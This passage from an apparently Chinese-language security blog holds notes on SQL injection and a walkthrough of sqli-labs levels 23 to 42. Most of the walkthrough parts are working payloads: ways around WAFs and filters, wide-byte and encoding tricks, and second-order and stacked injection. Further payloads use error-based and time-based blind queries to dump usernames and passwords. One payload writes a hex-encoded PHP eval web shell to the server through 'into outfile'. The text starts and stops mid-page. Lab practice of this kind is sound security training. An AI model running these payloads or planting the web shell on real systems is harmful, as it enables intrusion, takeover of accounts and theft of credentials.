空格</span><br></pre></td></tr></table></figure><p>2.绕过引号过滤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">编码进行绕过</span><br><span class="line">16进制绕过：table_name=&quot;users&quot;等价于table_name=0x7573657273因为hex(users)=7573657273</span><br><span class="line">宽字节注入</span><br></pre></td></tr></table></figure><p>3.绕过逗号过滤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">join代替逗号</span><br><span class="line">from pos for len：substr(&quot;string&quot;,1,3)等价于substr(&quot;string&quot; from 1 for 3)</span><br><span class="line">like：ascii(substr(user(),1,1))=114等价于 user() like &quot;r%&quot;</span><br><span class="line">offset：limit 2,1等价于limit 1 offset 2。适用于limit中的逗号被过滤的情况</span><br></pre></td></tr></table></figure><p>4.绕过等号过滤：<code>like</code>代替、<code>rlike</code>代替(模糊匹配)、<code>regexp</code>代替、<code>&lt;&gt;</code>等价于!&#x3D;：!(id&lt;&gt;1)、<code>strcmp(str1,str2)</code>、<code>between   and</code>、<code>in</code></p><p>5.绕过<code>&lt;</code>、<code>&gt;</code>过滤：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">greatest(n1,n2,n3,...) :返回其中的最大值</span><br><span class="line">strcmp(str1,str2) :当str1<span class="operator">=</span>str2，返回<span class="number">0</span>，当str1<span class="operator">&gt;</span>str2，返回<span class="number">1</span>，当str1<span class="operator">&lt;</span>str2，返回<span class="number">-1</span></span><br><span class="line"><span class="keyword">in</span> 操作符</span><br><span class="line"><span class="keyword">between</span>   <span class="keyword">and</span>:选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期。</span><br><span class="line">least(n1,n2,n3…):返回n中的最小值</span><br></pre></td></tr></table></figure><h4 id="3-寻找网站源ip绕过waf"><a href="#3-寻找网站源ip绕过waf" class="headerlink" title="3.寻找网站源ip绕过waf"></a>3.寻找网站源ip绕过waf</h4><p>对于具有云WAF防护的网站，只要找到网站的IP地址，通过IP访问网站，就可以绕过云WAF检测。</p><p>常见的寻找网站IP的方法由以下几种</p><ul><li>寻找网站的历史解析记录</li><li>多个不同区域ping网站，查看IP解析的结果</li><li>找网站的二级域名、NS、MX记录等对应的IP</li><li>订阅网站邮件，查看邮件发送方的IP</li></ul><h4 id="4-HTTP参数污染"><a href="#4-HTTP参数污染" class="headerlink" title="4.HTTP参数污染"></a>4.HTTP参数污染</h4><p>HTTP参数污染是指当同一个参数出现多次，不同的中间件会解析为不同的结果。index.php?id&#x3D;1&amp;id&#x3D;2获取到的参数具体如下图所示：</p><p><img src="image-20210220124830619.png" alt="image-20210220124830619"></p><h4 id="5-另寻注入点"><a href="#5-另寻注入点" class="headerlink" title="5.另寻注入点"></a>5.另寻注入点</h4><p>往往对url请求过滤比较严重，对http头的过滤不是很严格，前提是将http的内容存进数据库。</p><h3 id="2-二次注入"><a href="#2-二次注入" class="headerlink" title="2.二次注入"></a>2.二次注入</h3><p>利用条件：</p><p>（1）向数据库成功插入恶意语句</p><p>（2）数据库取出数据时不进行转义或者过滤</p><p>攻击过程：</p><p>黑客寻找注入点向数据库中插入恶意代码，再向数据库做第二次请求将第一次注入的代码调用出来即可。</p><h3 id="3-宽字节注入"><a href="#3-宽字节注入" class="headerlink" title="3.宽字节注入"></a>3.宽字节注入</h3><p>利用条件：PHP连接MySQL的时候，设置了“set character_set_client &#x3D; gbk”</p><p>原因：设置gbk之后，会导致编码转换的问题，gbk编码会认为两个ascii码为一个汉字，而必要条件是前一个ascii码大于 128 才能到汉字的范围。</p><p>利用：我们在过滤恶意url请求时，往往会将如<code>&#39;</code>进行转义<code>\&#39;</code>，而我们此时利用就是将其转义符给吃掉，有两种方法：</p><p>1.%df 。 urlencode(‘) &#x3D; %5c%27，%df%5c 在 GBK 编码方式的时候会将其编码为一个汉字。<code>%23</code>是<code>#</code>。另外还可以替代%df有：%E6，%99</p><p>2.过滤掉\。例如可以构造 %df%5c%5c%27 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。</p><p>通常两种提交方式：GET，POST都适用</p><p> 默认地，PHP对所有的GET、POST和COOKIE数据自动运行<code>addslashes()</code>。所以不应对已转义过的字符串使用<code>addslashes()</code>，因为这样会导致双层转义。遇到这种情况时可以使用函数<code>get_magic_quotes_gpc()</code>进行检测。</p><p>防御宽字节漏洞：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> character_set_connection<span class="operator">=</span>gbk,character_set_result<span class="operator">=</span>gbk,character_set_client<span class="operator">=</span><span class="type">binary</span></span><br><span class="line">#设置<span class="type">binary</span>的目的是mysql不区分大小写，使用<span class="type">binary</span>将字符串先转换为二进制字符串，即可避免</span><br></pre></td></tr></table></figure><h3 id="4-堆叠注入"><a href="#4-堆叠注入" class="headerlink" title="4.堆叠注入"></a>4.堆叠注入</h3><p>简单的说就是让多条语句一起执行。mssql、SQL server、Postgresql支持，而Oracle不支持。</p><p>类似union联合查询，但是union两边需要受限制，而堆叠不必，可以为任意增删改查。</p><p>可以看一下这篇文章：<a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p><p>另外，执行sql函数必须是<code>mysqli_multi_query()</code>(函数执行一个或多个针对数据库的查询,多个查询用分号进行分隔)。</p><h3 id="5-order-by-注入"><a href="#5-order-by-注入" class="headerlink" title="5.order by 注入"></a>5.order by 注入</h3><p>以sql 语句为例<code>$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</code><br>试<code>?sort=1 desc 或者 asc</code>，显示结果不同，则表明可以注入。<br>我们可利用 order by 后的一些参数进行注入</p><p><strong>注入方法</strong></p><ul><li><p>直接添加注入语句，?sort&#x3D;(select ******)</p></li><li><p>利用一些函数。例如 rand()函数等。?sort&#x3D;rand(sql 语句)<br>比如说rand(true&#x2F;false)</p></li><li><p>利用 and，例如?sort&#x3D;1 and (sql 语句)。</p></li><li><p>使用报错注入等方式，但需要有报错</p></li><li><p>导出文件 into outfile 参数注入</p><ul><li><pre><code>?sort=1 into outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-46\\test.txt&quot;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 利用 lines terminated by导出小马</span><br><span class="line"></span><br><span class="line">  ```sql</span><br><span class="line">  ?sort=1 into outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-46\\test.php&quot; lines terminated by 0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3e</span><br><span class="line">  #lines terminates by将每行以指定字符串结尾</span><br><span class="line">  #0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3e = hex(&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;)</span><br></pre></td></tr></table></figure></code></pre></li></ul></li><li><p>procedure analyse参数后注入</p><ul><li><p>通常我们可以利用它与sort函数一起执行报错注入<br>procedure analyse()函数是MySQL内置的对MySQL字段值进行统计分析后给出建议的字段类型。<br>语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">procesure analyse(max_elements,max_memory)</span><br><span class="line">max_elements：指定每列非重复值的最大值，当超过这个值的时候，MySQL不会推荐enum类型。</span><br><span class="line">max_memory：analyse()为每列找出所有非重复值所采用的最大内存大小。</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="2-靶场记录"><a href="#2-靶场记录" class="headerlink" title="2.靶场记录"></a>2.靶场记录</h2><h3 id="Less23：GET基于报错-过滤注释符-单引号"><a href="#Less23：GET基于报错-过滤注释符-单引号" class="headerlink" title="Less23：GET基于报错-过滤注释符(单引号)"></a>Less23：GET基于报错-过滤注释符(单引号)</h3><p>根据报错信息可以看到是单引号闭合，但是注释符被过滤了</p><p><img src="image-20210220185228076.png" alt="image-20210220185228076"></p><p>注释符被过滤只有采取后闭合了</p><p><img src="image-20210220185337477.png" alt="image-20210220185337477"></p><p>后续的爆表可以参考前面的系列了</p><h3 id="Less24：POST二次注入"><a href="#Less24：POST二次注入" class="headerlink" title="Less24：POST二次注入"></a>Less24：POST二次注入</h3><p>二次注入就是提前在数据库中插入恶意语句，再次提出来就🆗，本关所以先注册一个<code>admin&#39; #</code>的账户，后续使用此账户登录再修改此账户的密码即可实现修改admin密码。原理如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">插入数据库</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users ( &quot;admin\&#x27; #&quot;,&quot;password&quot;) <span class="keyword">values</span>(\&quot;$username\&quot;, \&quot;$pass\&quot;);</span><br><span class="line">更新信息：</span><br><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> #<span class="string">&#x27; and password=&#x27;</span>$curr_pass<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">也即</span></span><br><span class="line"><span class="string">UPDATE users SET PASSWORD=&#x27;</span>$pass<span class="string">&#x27; where username=&#x27;</span>admin<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>这里有一个疑问，为什么后台使用了<code>mysql_escape_string()</code>没有过滤掉特殊符号<code>&#39;#</code>呢？经过实验使用有以下结果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a<span class="operator">=</span>mysql_escape_string($_GET[<span class="string">&#x27;a&#x27;</span>]);#$a<span class="operator">=</span>admin\<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$a=mysql_escape_string($_POST[&#x27;</span>a<span class="string">&#x27;]);#$a=admin\&#x27;</span> #</span><br><span class="line">$a<span class="operator">=</span>mysql_real_escape_string($_GET[<span class="string">&#x27;a&#x27;</span>]);#$a<span class="operator">=</span>admin\<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$a=mysql_real_escape_string($_POST[&#x27;</span>a<span class="string">&#x27;]);#$a=admin\&#x27;</span> #</span><br></pre></td></tr></table></figure><p><code>mysql_escape_string()和mysql_real_escape_string()</code>采取GET传递参数得到的结果是<code>\&#39;</code>，使用POST提交后虽然结果是<code>\&#39;#</code>，但是这在数据库插入语句里面恰恰代表转义，所以此次存入数据库是<code>admin&#39; #</code>。</p><h3 id="Less25：GET基于报错字符型-过滤and和or-单引号"><a href="#Less25：GET基于报错字符型-过滤and和or-单引号" class="headerlink" title="Less25：GET基于报错字符型-过滤and和or(单引号)"></a>Less25：GET基于报错字符型-过滤and和or(单引号)</h3><p>如题目所示，过滤and和or，其实还过滤了#、–+，没有过滤<code>-- </code>注释</p><p>但是题目是考察and和or过滤怎么办，所以乖乖做吧</p><p>经过实验，双写and和or，||，可以绕过过滤。</p><p>但是现实中如果过不了可以考虑不用and和or</p><h3 id="Less25a：盲注-过滤and和or"><a href="#Less25a：盲注-过滤and和or" class="headerlink" title="Less25a：盲注-过滤and和or"></a>Less25a：盲注-过滤and和or</h3><p>这一关和上一关一样，只是是数字型注入。</p><p>采用时间盲注和联合查询都🆗</p><h3 id="Less26：GET基于报错-过滤空格和注释"><a href="#Less26：GET基于报错-过滤空格和注释" class="headerlink" title="Less26：GET基于报错-过滤空格和注释"></a>Less26：GET基于报错-过滤空格和注释</h3><p>这一关三种注释方法都过滤了，所以只能考虑闭合了，而且还简单的过滤了and和or，但是实验双写and和or可以绕过。</p><p>但是本人把已知的所有可以代替空格的都试了一遍都不行就他妈离谱。。。</p><p>鉴于此采取报错注入吧</p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">数据库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;oorr(extractvalue(1,concat(0x7e,(select(database())),0x7e)))aandnd &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">表</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;oorr(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),0x7e)))aandnd&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">字段</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;oorr(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())aandnd(table_name=&#x27;</span>users<span class="string">&#x27;)),0x7e)))aandnd&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">用户名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;oorr(extractvalue(1,concat(0x7e,(select(group_concat(passwoorrd))from(users)),0x7e)))aandnd&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">密码</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;oorr(extractvalue(1,concat(0x7e,(select(group_concat(passwoorrd))from(users)),0x7e)))aandnd&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="image-20210221020630487.png" alt="image-20210221020630487"></p><p>结果可行的。</p><h3 id="Less26a：盲注-过滤空格和注释"><a href="#Less26a：盲注-过滤空格和注释" class="headerlink" title="Less26a：盲注-过滤空格和注释"></a>Less26a：盲注-过滤空格和注释</h3><p>太难了。。。不显示错误就不能用报错了，延时注入吧。</p><h3 id="Less27：GET基于报错-过滤union和select"><a href="#Less27：GET基于报错-过滤union和select" class="headerlink" title="Less27：GET基于报错-过滤union和select"></a>Less27：GET基于报错-过滤union和select</h3><p>题目告诉我们本关卡过滤了 union 和 select，其实还有空格，经过实验大小写可以绕过，报错注入</p><p>payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">表</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and(extractvalue(1,concat(0x7e,(SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e)))and&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">字段</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and(extractvalue(1,concat(0x7e,(SeLect(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name=&#x27;</span>users<span class="string">&#x27;)),0x7e)))and&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">用户名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and(extractvalue(1,concat(0x7e,(SeLect(group_concat(username))from(users)),0x7e)))and&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">密码</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and(extractvalue(1,concat(0x7e,(SeLect(group_concat(password))from(users)),0x7e)))and&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="Less27a：盲注-过滤union和select"><a href="#Less27a：盲注-过滤union和select" class="headerlink" title="Less27a：盲注-过滤union和select"></a>Less27a：盲注-过滤union和select</h3><p>时间盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">表</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;and(if(ascii(substr((SeLect(table_name)from(SeLect(table_name)(table_rows)from(information_schema.tables)where(table_schema=database())and(table_rows=14))a),1,1))=117,sleep(5),0))and&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line">字段</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;and(if(ascii(substr((SeLect(column_name)from(information_schema.columns)where(table_schema=database()) and(table_name=&#x27;users&#x27;)and(ordinal_position=1)),1,1))=105,sleep(5),0))and&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line">用户名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;and(if(ascii((substr((SeLect(username)from(users)where(id=1)),1,1)))=68,sleep(5),0))and&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line">密码</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;and(if(ascii((substr((SeLect(password)from(users)where(id=1)),1,1)))=68,sleep(5),0))and&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>手工注入很麻烦的，建议用以上payload到burp抓包进行爆破，用burp抓包爆破可以改一下payload不用时间盲注。</p><h3 id="Less28：GET基于报错字符型-过滤union和select-带括号的单引号"><a href="#Less28：GET基于报错字符型-过滤union和select-带括号的单引号" class="headerlink" title="Less28：GET基于报错字符型-过滤union和select(带括号的单引号)"></a>Less28：GET基于报错字符型-过滤union和select(带括号的单引号)</h3><p>这一关题目虽然是说过滤union和select，结果一试把注释和空格也给过了，而且也没有报错信息。。。就时间盲注吧</p><p>payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">表</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)and(if(ascii(substr((SeLect(table_name)from(SeLect(table_name),(table_rows)from(information_schema.tables)where(table_schema=database())and(table_rows=14))a),1,1))=117,sleep(5),0))and(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span></span><br><span class="line">字段</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)and(if(ascii(substr((SeLect(column_name)from(information_schema.columns)where(table_schema=database())and(table_name=&#x27;</span>users<span class="string">&#x27;)and(ordinal_position=1)),1,1))=105,sleep(5),0))and(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span></span><br><span class="line">用户名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)and(if(ascii((substr((SeLect(username)from(users)where(id=1)),1,1)))=68,sleep(5),0))and(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span></span><br><span class="line">密码</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)and(if(ascii((substr((SeLect(password)from(users)where(id=1)),1,1)))=68,sleep(5),0))and(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="Less28a：GET-盲注-过滤union和select-带括号的单引号"><a href="#Less28a：GET-盲注-过滤union和select-带括号的单引号" class="headerlink" title="Less28a：GET-盲注-过滤union和select(带括号的单引号)"></a>Less28a：GET-盲注-过滤union和select(带括号的单引号)</h3><p>解法和上一关一样~。</p><h3 id="Less29：GET基于报错-不匹配-有waf"><a href="#Less29：GET基于报错-不匹配-有waf" class="headerlink" title="Less29：GET基于报错-??不匹配-有waf"></a>Less29：GET基于报错-??不匹配-有waf</h3><p>名字稀奇古怪的，应该是作者鹰钩利息不大好的亚子，，，</p><p>确定有waf？？？经实验只是吃掉了<code>#</code>，后面就按照前一个系列的慢慢来爆信息吧</p><h3 id="Less30：GET盲注-不匹配-有waf"><a href="#Less30：GET盲注-不匹配-有waf" class="headerlink" title="Less30：GET盲注-??不匹配-有waf"></a>Less30：GET盲注-??不匹配-有waf</h3><p>经实验只是在上一关的基础上减少了报错，并且闭合是双引号。说是盲注，算是吧。。。剩下的和上一关也一样。</p><p>有点怀疑自己是不是哪里错了？？？</p><h3 id="Less31：GET盲注-不匹配-有waf"><a href="#Less31：GET盲注-不匹配-有waf" class="headerlink" title="Less31：GET盲注-??不匹配-有waf"></a>Less31：GET盲注-??不匹配-有waf</h3><p>这一关是<code>&quot;)</code>闭合，且过滤了<code>#</code>，但是有一个问题，如果环境是php+apache，不会发现问题，JSP+tomcat会发现以<code>id=-1</code>强制报错时不会得出结果，原因就在文章开头讲的http参数污染。其他都一样。</p><h3 id="Less32：GET-bypass自定义过滤和转义"><a href="#Less32：GET-bypass自定义过滤和转义" class="headerlink" title="Less32：GET-bypass自定义过滤和转义"></a>Less32：GET-bypass自定义过滤和转义</h3><p>观察有转义和16进制编码，那么猜测这一关就是编码注入了</p><p><img src="image-20210221172214978.png" alt="image-20210221172214978"></p><p>试试宽字节注入<code>?id=-1%df%27%20union%20select%201,database(),3%23</code>成功！</p><p><img src="image-20210221173335731.png" alt="image-20210221173335731"></p><h3 id="Less33：GET-bypass转义符"><a href="#Less33：GET-bypass转义符" class="headerlink" title="Less33：GET-bypass转义符"></a>Less33：GET-bypass转义符</h3><p>这一关上一关的payload也可以用🤣</p><p><img src="image-20210221173518057.png" alt="image-20210221173518057"></p><p>看一下这关的源码，使用了<code>addslashes()</code>函数进行转义特殊字符，但是依旧可以使用编码绕过。</p><h3 id="Less34：POST-bypass转义符"><a href="#Less34：POST-bypass转义符" class="headerlink" title="Less34：POST-bypass转义符"></a>Less34：POST-bypass转义符</h3><p>本关只是addslashes过滤，所以只对特殊符号有影响，所以本小节只介绍两种不曾遇到的方式。</p><p>本节参考：<a href="https://blog.csdn.net/weixin_39934520/article/details/105896415">https://blog.csdn.net/weixin_39934520/article/details/105896415</a></p><p>这一关采用POST提交数据，与GET区别是：get是以 url 形式 提交的，因此数据会通过 URLencode，此处作何解?</p><p>关于Unicode的拓展学习可以参考：<a href="https://www.cnblogs.com/fnlingnzb-learner/p/6163205.html">Unicode令人混淆的概念</a></p><h4 id="1-宽字节注入"><a href="#1-宽字节注入" class="headerlink" title="1.宽字节注入"></a>1.宽字节注入</h4><p>宽字节注入和 GET 中并无差别，使用<code>%bb%27</code>或<code>%bb%5c%5c%27</code>代替<code>&#39;</code>均可，在这里同样可以平级越权</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=%bb&#x27; or 1 limit 1,1#&amp;passwd=1</span><br></pre></td></tr></table></figure></blockquote><p><img src="image-20210221193343896.png" alt="image-20210221193343896"></p><p>但是使用hackbar无法成功，原因是%经过url编码为%25，又生了一次变异，所以无法成功</p><h4 id="2-编码转换注入"><a href="#2-编码转换注入" class="headerlink" title="2.编码转换注入"></a>2.编码转换注入</h4><p>将 UTF-8 的<code>&#39;</code>转换为 UTF-16 的<code>�&#39;</code>实现注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&#x27; or 1=1#&amp;passwd=1</span><br></pre></td></tr></table></figure><p><img src="image-20210221224901414.png" alt="image-20210221224901414"></p><h3 id="Less35：GET-bypass转义数字型"><a href="#Less35：GET-bypass转义数字型" class="headerlink" title="Less35：GET-bypass转义数字型"></a>Less35：GET-bypass转义数字型</h3><p>经实验，注释符只有<code>-- senull</code>有效，其他什么都没变，过滤函数是addslashes()，而且没有闭合，直接写语句再注释就可以了</p><p><img src="image-20210221235949699.png" alt="image-20210221235949699"></p><h3 id="Less36：GET-bypass-mysql-real-escape-string"><a href="#Less36：GET-bypass-mysql-real-escape-string" class="headerlink" title="Less36：GET-bypass mysql_real_escape_string"></a>Less36：GET-bypass mysql_real_escape_string</h3><p>关于<code>mysql_real_escape_string</code>上面的二次注入讲到过，会转义特殊符号(\x00.\n,\r,,“,\x1a)，和过滤<code>#</code>，所以注释只能用<code>-- senull</code>(哭，别人都只是过滤单引号。。。)</p><p>对于此函数，若mysql没有设置GBK，还是可以突破的</p><p><img src="image-20210222002858692.png" alt="image-20210222002858692"></p><h3 id="Less37：POST-bypass-mysql-real-escape-string"><a href="#Less37：POST-bypass-mysql-real-escape-string" class="headerlink" title="Less37：POST-bypass mysql_real_escape_string"></a>Less37：POST-bypass mysql_real_escape_string</h3><p>老规矩，碰到登录框试试万能密码，可以成功</p><p><img src="image-20210222003622420.png" alt="image-20210222003622420"></p><p>爆数据库可以走通</p><p><img src="image-20210222003533575.png" alt="image-20210222003533575"></p><p>说来也奇怪，以下payload只能burp抓包修改才能成功，浏览器直接做会失败，显示<code>�</code>被转义为<code>�\&#39;</code>,按理说这个没有<code>%</code>啊？？？</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">表</span><br><span class="line"><span class="operator">-</span>admin�<span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span></span><br><span class="line"><span class="string">字段</span></span><br><span class="line"><span class="string">uname=-admin%E3&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span> <span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br><span class="line">用户名和密码</span><br><span class="line">uname<span class="operator">=</span><span class="operator">-</span>admin<span class="operator">%</span>E3<span class="string">&#x27; union select 1,group_concat(username,0x3a,password) from users --+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h3 id="Less38：GET-堆叠注入字符型-单引号"><a href="#Less38：GET-堆叠注入字符型-单引号" class="headerlink" title="Less38：GET-堆叠注入字符型(单引号)"></a>Less38：GET-堆叠注入字符型(单引号)</h3><p>这一关比较简单，例如插入数据库一个消息</p><p><img src="image-20210222010314740.png" alt="image-20210222010314740"></p><h3 id="Less39：GET-堆叠注入数字型"><a href="#Less39：GET-堆叠注入数字型" class="headerlink" title="Less39：GET-堆叠注入数字型"></a>Less39：GET-堆叠注入数字型</h3><p>和上一关一样，只不过是数字型，没有闭合。</p><h3 id="Less40：GET-盲注-堆叠-字符型-bool-单引号-小括号"><a href="#Less40：GET-盲注-堆叠-字符型-bool-单引号-小括号" class="headerlink" title="Less40：GET-盲注-堆叠-字符型(bool 单引号 小括号)"></a>Less40：GET-盲注-堆叠-字符型(bool 单引号 小括号)</h3><p>这一关有点小毛病，我也不知道哪里出问题了</p><p><img src="image-20210222013912933.png" alt="image-20210222013912933"><img src="image-20210222013935083.png" alt="image-20210222013935083"></p><p>啊这。。但是用双引号闭合进行堆叠注入的时候注入不了，单引号又ok？？？</p><p><img src="image-20210222014215664.png" alt="image-20210222014147624"><img src="image-20210222014257803.png" alt="image-20210222014257803"></p><h3 id="Less41：GET-数字型盲注-堆叠"><a href="#Less41：GET-数字型盲注-堆叠" class="headerlink" title="Less41：GET-数字型盲注-堆叠"></a>Less41：GET-数字型盲注-堆叠</h3><p>这一关和39一样的，只不过没有报错，是盲注</p><h3 id="Less42：POST-基于报错的堆叠注入字符型"><a href="#Less42：POST-基于报错的堆叠注入字符型" class="headerlink" title="Less42：POST-基于报错的堆叠注入字符型"></a>Less42：POST-基于报错的堆叠注入字符型</h3><p>嘿嘿，这一关注册和更改密码都没法用，只能在登录界面搞事情。</p><p>通过试错，发现语句大概是：<code>SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;</code>,这就好办了，直接在密码后面加新插入信息的语句就可了，其实后面有没有语句都无所谓，注释了就🆗了</p><p>payload：<code>mima&#39;;insert into users values(42,&#39;Less42&#39;,&#39;Less42&#39;)#</code></p><p><strong>注意：输入框中不要用–+是因为+不会进行url编码，因为他不在url地址栏中，可以使用 # %23 – #</strong></p><h3 id="Less43：POST-基于报错的堆叠注入字符型-带括号"><a href="#Less43：POST-基于报错的堆叠注入字符型-带括号" class="headerlink" 